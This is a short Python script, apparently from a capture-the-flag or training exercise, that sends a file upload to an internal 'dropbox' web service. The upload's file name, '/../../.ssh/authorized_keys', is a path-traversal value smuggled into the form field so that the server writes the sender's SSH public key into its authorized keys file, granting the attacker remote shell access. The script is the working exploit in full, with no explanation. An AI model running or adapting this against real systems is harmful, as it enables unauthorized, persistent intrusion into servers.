import requests

upload_key = {
    "file": (
        "/../../.ssh/authorized_keys",
        open("./ssh_key", "rb"),
        "application/octet-stream"
    )
}

url = "https://dropbox.internal.regjeringen.uiaikt.no/"
response = requests.post(url, files=upload_key)
print(response.text)